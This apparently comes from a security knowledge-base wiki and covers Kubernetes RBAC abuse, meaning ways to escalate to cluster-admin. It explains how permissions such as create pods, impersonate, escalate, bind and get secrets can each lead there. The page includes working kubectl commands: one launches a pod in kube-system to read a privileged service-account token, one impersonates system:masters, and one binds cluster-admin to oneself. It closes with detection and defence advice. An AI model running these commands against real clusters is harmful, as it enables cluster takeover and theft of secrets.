---
title: Kubernetes RBAC abuse
slug: k8s-rbac-abuse
---

> **TL;DR:** A handful of verb/resource pairs (`create pods`, `impersonate`, `escalate`, `bind`, `get secrets`, `create token`) are silent cluster-admin escalations even when they look scoped.

## What it is
Kubernetes RBAC grants verbs (`get`, `list`, `create`, `update`, `patch`, `delete`, plus special verbs `impersonate`, `escalate`, `bind`) on resources to subjects. Multiple verbs look harmless but compose into cluster-admin: `create pods` lets you mount any ServiceAccount token; `impersonate` on users/groups lets you act as a Cluster Admin; `escalate` + `bind` on roles/clusterroles lets you grant yourself anything; `get/list secrets` in the right namespace reveals controller tokens; `create serviceaccounts/token` (TokenRequest) mints SA tokens at will. Even namespace-scoped `Role`s can be terminal if the namespace hosts a controller's SA.

## Preconditions / where it applies
- Authenticated context as any subject — user, group, ServiceAccount token (compromised pod), or external identity federated in.
- Cluster uses RBAC (the only authoriser left in modern Kubernetes).
- Targets: namespaces with privileged controllers (kube-system, ingress-nginx, cert-manager, ArgoCD).

## Technique
1. Map your permissions with `kubectl auth can-i --list` and `rakkess`.
2. Identify a single high-value verb you hold.
3. Compose to cluster-admin.

```bash
kubectl auth can-i --list
kubectl auth can-i --list -n kube-system
rakkess --as system:serviceaccount:default:default
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.namespace=="default")'
```

```bash
# 'create pods' in any namespace with privileged SAs -> mount their token
kubectl run pwn -n kube-system --image=busybox --overrides='{
  "spec":{"serviceAccountName":"clusterrole-aggregation-controller",
          "containers":[{"name":"pwn","image":"busybox","command":["sleep","9999"]}]}}'
kubectl exec -n kube-system pwn -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

```bash
# 'impersonate' -> act as cluster-admin
kubectl get secrets -A --as=system:admin
kubectl --as=system:masters get clusterrolebindings

# 'escalate' + 'bind' on clusterroles -> self-promote
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=$(whoami)
```

Other primitives worth remembering: `update`/`patch` on a `Node` lets you alter taints and reschedule a kubelet onto a tainted node; `create` on `validatingwebhookconfigurations` lets you intercept every API write; `get` on `secrets` in `kube-system` usually finds the cluster-signing-key.

## Detection and defence
- Audit policy: log every RBAC mutation and every TokenRequest with metadata. Alert on bindings to `cluster-admin`, `system:masters`.
- Use `kubectl rbac-tool` or `kubectl-who-can` periodically to map effective permissions and prune.
- Disable automounting of SA tokens by default; use bound, audience-scoped tokens via Projected Volumes.
- For cluster-admin tasks, require external auth (OIDC + step-up) rather than long-lived tokens.
- Related: [[k8s-etcd-attacks]], [[k8s-ingressnightmare]].

## References
- [Kubernetes — Using RBAC Authorization](https://kubernetes.io/docs/reference/access-authn-authz/rbac/) — official semantics of `escalate`, `bind`, `impersonate`.
- [BishopFox — Bad Pods](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation) — pod-spec abuses tied to RBAC verbs.
- [appsecco — Attacking Kubernetes through RBAC](https://blog.appsecco.com/attacking-kubernetes-clusters-using-the-kubernetes-api-2ee2e3a6c4dd) — recipe library.

See also: [[k8s-service-account-tokens]], [[k8s-privileged-pod]], [[k8s-admission-controllers]], [[kubelet-exposed-api-attacks]], [[k8s-image-registry-poisoning]], [[gke-workload-identity-abuse]], [[eks-pod-identity-abuse]]
